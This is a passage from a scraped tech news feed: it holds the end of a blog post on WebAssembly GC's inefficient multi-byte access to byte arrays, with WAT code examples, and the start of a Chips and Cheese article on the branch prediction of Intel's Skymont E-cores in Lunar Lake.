WAT format:</p><pre><code><span>(</span><span>module</span>
 <span>(</span><span>type</span> <span>$bytevector</span> <span>(</span><span>array</span> <span>i8</span><span>)</span><span>)</span>
 <span>(</span><span>data</span> <span>$init</span> <span>#u32</span><span>(</span><span>123456789</span><span>)</span><span>)</span>
 <span>(</span><span>func</span> <span>(</span><span>export</span> <span>"main"</span><span>)</span> <span>(</span><span>result</span> <span>i32</span><span>)</span>
       <span>(</span><span>local</span> <span>$a</span> <span>(</span><span>ref</span> <span>$bytevector</span><span>)</span><span>)</span>
       <span>(</span><span>local.set</span> <span>$a</span> <span>(</span><span>array.new_data</span> <span>$bytevector</span> <span>$init</span>
                                     <span>(</span><span>i32.const</span> <span>0</span><span>)</span>
                                     <span>(</span><span>i32.const</span> <span>4</span><span>)</span><span>)</span><span>)</span>
       <span>(</span><span>array.get_u</span> <span>$bytevector</span> <span>(</span><span>local.get</span> <span>$a</span><span>)</span> <span>(</span><span>i32.const</span> <span>0</span><span>)</span><span>)</span>
       <span>(</span><span>i32.shl</span> <span>(</span><span>array.get_u</span> <span>$bytevector</span> <span>(</span><span>local.get</span> <span>$a</span><span>)</span> <span>(</span><span>i32.const</span> <span>1</span><span>)</span><span>)</span>
                <span>(</span><span>i32.const</span> <span>8</span><span>)</span><span>)</span>
       <span>(</span><span>i32.or</span><span>)</span>
       <span>(</span><span>i32.shl</span> <span>(</span><span>array.get_u</span> <span>$bytevector</span> <span>(</span><span>local.get</span> <span>$a</span><span>)</span> <span>(</span><span>i32.const</span> <span>2</span><span>)</span><span>)</span>
                <span>(</span><span>i32.const</span> <span>16</span><span>)</span><span>)</span>
       <span>(</span><span>i32.or</span><span>)</span>
       <span>(</span><span>i32.shl</span> <span>(</span><span>array.get_u</span> <span>$bytevector</span> <span>(</span><span>local.get</span> <span>$a</span><span>)</span> <span>(</span><span>i32.const</span> <span>3</span><span>)</span><span>)</span>
                <span>(</span><span>i32.const</span> <span>24</span><span>)</span><span>)</span>
       <span>(</span><span>i32.or</span><span>)</span><span>)</span><span>)</span></code></pre><p>By contrast, Wasm linear memory needs but a single <code>i32.load</code>
instruction:</p><pre><code><span>(</span><span>module</span>
 <span>(</span><span>memory</span> <span>1</span><span>)</span>
 <span>(</span><span>func</span> <span>(</span><span>export</span> <span>"main"</span><span>)</span> <span>(</span><span>result</span> <span>i32</span><span>)</span>
       <span>(</span><span>i32.store</span> <span>(</span><span>i32.const</span> <span>0</span><span>)</span> <span>(</span><span>i32.const</span> <span>123456789</span><span>)</span><span>)</span>
       <span>(</span><span>i32.load</span> <span>(</span><span>i32.const</span> <span>0</span><span>)</span><span>)</span><span>)</span><span>)</span></code></pre><p>Easy peasy.  Not only is it less code, it's a lot more efficient.</p><p>The triangle example above uses static vertex data stuffed into
bytevector literals, so it doesn’t hit this problem, but real programs
that have dynamic buffer data will be slower than their linear memory
equivalents.</p><h2>Unsatisfying workarounds</h2><p>There’s no way around the multi-byte problem at the moment, but for
byte access from JavaScript there are some things we could try to work
with what we have been given.  Spoiler alert: None of them are
pleasant.</p><h3>Use Uint8Array from the host</h3><p>This approach makes all binary operations from within the Wasm binary
slow since we’d have to cross the Wasm-&gt;JS bridge for each read/write.
Since most of the binary data manipulation is happening in the Wasm
module, this approach will just make things slower overall.</p><h3>Use linear memory for bytevectors</h3><p>This would require a little <code>malloc</code>/<code>free</code> implementation and a way
to reclaim memory for GC'd bytevectors.  You could register every
bytevector in a <code>FinalizationRegistry</code> in order to be notified upon GC
and <code>free</code> the memory.  Now you have to deal with memory
fragmentation.  This is Wasm GC, we shouldn’t have to do any of this!</p><h3>Use linear memory as a scratch space</h3><p>This avoids crossing the Wasm/JS boundary for each byte, but still
involves a byte-by-byte copy from <code>(array i8)</code> to linear memory within
the Wasm module.  So far this feels like the least worst option, but
the extra copy is still going to greatly reduce throughput.</p><h2>Wasm GC needs some fixin'</h2><p>I’ve used realtime graphics as an example because it’s a use case that
is very sensitive to performance issues, but this unfortunate need to
copy binary data byte-by-byte is also the reason why <a href="https://wingolog.org/archives/2023/10/19/requiem-for-a-stringref">strings are
trash</a>
on Wasm GC right now.
<a href="https://github.com/WebAssembly/stringref">Stringref</a> is a good
proposal and the Wasm community group made a mistake by rejecting it.</p><p>Anyway, there has been some discussion about both
<a href="https://github.com/WebAssembly/gc/issues/395">multi-byte</a> and
<a href="https://github.com/WebAssembly/gc/issues/568"><code>ArrayBuffer</code></a> access
on GitHub, but as far as I can tell neither issue is anywhere close to
a resolution.</p><p>Can these things be implemented efficiently?  How can the need for
direct access to packed arrays from JS be reconciled with Wasm heap
object opaqueness?  I hope the Wasm community group can arrive at
solutions sooner than later because it will take a long time to get
the proposal(s) to phase 4 and shipped in all browsers, perhaps years.
I am getting by making simple things with HTML5 Canvas but it would be
a shame to be effectively shut out from using WebGPU when it finally
reaches stable browser releases.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Skymont: Intel's E-Cores reach for the Sky (117 pts)]]></title>
            <link>https://chipsandcheese.com/p/skymont-intels-e-cores-reach-for-the-sky</link>
            <guid>42750734</guid>
            <pubDate>Sat, 18 Jan 2025 19:27:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/p/skymont-intels-e-cores-reach-for-the-sky">https://chipsandcheese.com/p/skymont-intels-e-cores-reach-for-the-sky</a>, See on <a href="https://news.ycombinator.com/item?id=42750734">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>The 2020s were a fun time for Intel’s Atom line, which went from an afterthought to playing a major role across Intel’s high performance client offerings. Intel’s latest mobile chip, codenamed Lunar Lake, sees Intel’s high performance P-Cores ditch SMT. With P-Cores focusing even more on single threaded performance, E-Cores will play an even more prominent role in boosting multithreaded performance. With Intel facing stronger competition than ever in the laptop scene, power efficiency is also important. Skymont is Intel’s latest E-Core architecture, and replaces Crestmont in the outgoing Meteor Lake mobile chips.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32534" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg" width="688" height="385" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:385,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32534&quot;,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe7f2c9b1-db97-431b-84ff-b9192e3ac3a3_1912x1070.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>In Lunar Lake, Skymont serves both of those goals. Meteor Lake’s two levels of E-Cores have been combined into one in Lunar Lake, designed both to boost multithreaded performance and handle low priority background tasks. Meteor Lake boosted multithreaded performance with Crestmont E-Cores attached to the ring bus and L3. Two other low power Crestmont cores sat on a low power island to handle background tasks and let the higher performance cores power down more often.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32532" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg" width="688" height="386" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:386,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32532&quot;,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F71655a0b-dafd-495e-b6f2-051a7792275d_1914x1075.jpeg 1456w" sizes="100vw"></picture></div></a></figure></div><p>Lunar Lake’s quad core Skymont cluster sits on a low power island, letting it handle light background tasks without waking the P-Cores. But it’s also on the same TSMC N3B process node as the P-Cores, and gets an improved cache hierarchy compared to Meteor Lake’s rather weak low power E-Cores. That combination lets Skymont serve both roles with a single core variant. Intel evidently decided more core levels wasn’t a good thing. They also decided just four E-Cores would be adequate, so Skymont has some big shoes to fill.</p><p>Skymont is a substantial step over its predecessor, Crestmont. At a high level, it’s an eight-wide out-of-order core. In many areas, it’s not far off Intel’s P-Cores or latest members of AMD’s Zen line. Skymont of course can’t run at the same clock speeds and can’t compete in absolute performance. However, it’s a good showcase of how sophisticated a density optimized core can get on a modern process node.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32518" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg" width="688" height="353" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:353,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32518&quot;,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76792650-42ed-4bb4-86ce-cd5c991f2a23_2200x1129.jpeg 1456w" sizes="100vw"></picture></div></a><figcaption>Keep in mind these block diagrams are an approximation. Digging into a distributed scheduler layout is a nightmare and very error prone</figcaption></figure></div><p>Digging deeper, Skymont is a clear relative of Crestmont. Both use a distributed scheduler layout with a lot of ports, and have distinguishing features like a clustered frontend. However, the scope of Skymont’s changes is pretty huge.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_drawio/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg" width="688" height="417" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:417,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_drawio/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6557b51-5832-4758-88fb-121c13efc6a2_1876x1138.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Impressively, Intel was able to deliver Skymont at the same time as Lion Cove, which also delivers large changes over its predecessor. Intel fighting hard to retain the laptop market that it nearly dominated a decade ago, and Lunar Lake is the result of a big company steaming ahead with all boilers lit.</p><p>Branch prediction accuracy affects both performance and power, because wasted work costs both power and core resources downstream. When faced with crazy long random patterns, Skymont doesn’t do quite as well as Intel or AMD’s latest high performance cores. However, it’s a clear step ahead of Crestmont.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skt_branchhist/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png" width="688" height="335" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:335,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skt_branchhist/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96cd2f88-20c0-46ce-b7e4-87bf01ff34e7_1100x536.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>If there are a few branches in play, Skymont can deal with a longer repeating random pattern. With 512 branches each going through a different random pattern, Skymont falls apart after the random pattern is longer than 48, a good improvement over 16 on Crestmont. Perhaps Intel has given Skymont’s predictor a lot more storage for branch history.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_branchhist/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png" width="688" height="405" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:405,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_branchhist/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4f89390-2c78-48ee-b610-f045009fa2be_1164x686.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Getting a branch’s direction right is only one part of the picture. The point of a branch predictor is to go fast and minimize delays from control flow dependencies. To do so, modern branch predictor can run far ahead of instruction fetch, queueing up cache miss requests and using memory level parallelism to mitigate L2 or even L3 latency. Caching branch targets is crucial because it lets the predictor tell where a branch goes without waiting for it to arrive at the core. Skymont can cache up to 8K branch targets in its last level branch target buffer.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skt_btb/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 1456w" sizes="100vw"><img 